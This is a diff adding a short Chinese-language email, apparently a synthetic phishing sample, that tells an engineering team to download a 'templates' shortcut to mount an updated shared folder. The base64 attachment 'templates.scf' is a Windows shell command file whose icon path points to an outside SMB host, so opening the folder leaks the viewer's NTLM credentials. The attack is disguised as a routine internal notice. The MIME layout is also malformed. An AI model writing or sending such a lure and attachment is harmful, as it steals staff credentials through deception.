@@ -1,0 +1,22 @@
+From: =?utf-8?B?5YWx5Lqr?= <share@doc-share6.example>
+To: eng@corp.internal
+Date: Fri, 11 Sep 2026 08:19:00 +0800
+Message-ID: <0009-b19@synth.example>
+Subject: 共享文件夹更新
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+共享里的模板库更新了，下载这个快捷方式直接挂载：
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+见正文。
+--BS
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="templates.scf"
+Content-Transfer-Encoding: base64
+
+W1NoZWxsXQ0KSWNvblJlc291cmNlPVxcMjAzLjAuMTEzLjk1XGljb24NCg==
+--BS--
